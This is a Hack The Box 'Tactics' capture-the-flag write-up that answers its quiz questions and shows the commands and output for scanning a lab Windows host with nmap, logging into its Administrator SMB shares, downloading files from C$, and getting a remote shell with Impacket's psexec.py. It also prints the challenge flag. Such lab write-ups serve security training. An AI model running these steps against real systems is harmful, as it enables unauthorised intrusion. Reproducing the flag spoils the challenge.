# Tactics (Windows)

## Machine Details 

- **CTF:** Hack The Box
- **Category:** Tier 1

## Solution

#### 1. Which Nmap switch can we use to enumerate machines when our ping ICMP packets are blocked by the Windows firewall?

> -Pn

#### 2. What does the 3-letter acronym SMB stand for?

> Server Message Block

#### 3. What port does SMB use to operate at?

```sh
$ nmap -Pn 10.129.142.70
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-02 21:39 CET
Nmap scan report for 10.129.142.70
Host is up (0.032s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 49.31 seconds
```

> 445

#### 4. What command line argument do you give to `smbclient` to list available shares?

> -l

#### 5. What character at the end of a share name indicates it's an administrative share?

> $

#### 6. Which Administrative share is accessible on the box that allows users to view the whole file system?

```sh
$ smbclient -L 10.129.142.70 -U Administrator
Password for [WORKGROUP\Administrator]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

> C$

#### 7. What command can we use to download the files we find on the SMB Share?

> get

#### 8. Which tool that is part of the Impacket collection can be used to get an interactive shell on the system?

> PSexec.py

#### Submit root flag

- **Option 1**:

	```sh
	$ smbclient \\\\10.129.142.70\\C$ -U Administrator   
	Password for [WORKGROUP\Administrator]:
	Try "help" to get a list of possible commands.
	smb: \> get Users\Administrator\Desktop\flag.txt
	getting file \Users\Administrator\Desktop\flag.txt of size 32 as Users\Administrator\Desktop\flag.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
	```
	
	```sh
	cat Users\\Administrator\\Desktop\\flag.txt
	f751c19eda8f61ce81827e6930a1f40c
	```

- **Option 2** *([psexec](https://github.com/fortra/impacket))*:

	```sh
	$ psexec.py administrator@10.129.142.70
	Impacket v0.11.0 - Copyright 2023 Fortra
	
	Password:
	[*] Requesting shares on 10.129.142.70.....
	[*] Found writable share ADMIN$
	[*] Uploading file pmmeNEhX.exe
	[*] Opening SVCManager on 10.129.142.70.....
	[*] Creating service bPKk on 10.129.142.70.....
	[*] Starting service bPKk.....
	[!] Press help for extra shell commands
	Microsoft Windows [Version 10.0.17763.107]
	(c) 2018 Microsoft Corporation. All rights reserved.
	
	C:\Windows\System32> type C:\Users\Administrator\Desktop\flag.txt
	f751c19eda8f61ce81827e6930a1f40c
	```

## Final Flag

> f751c19eda8f61ce81827e6930a1f40c

*Created by [bu19akov](https://github.com/bu19akov)*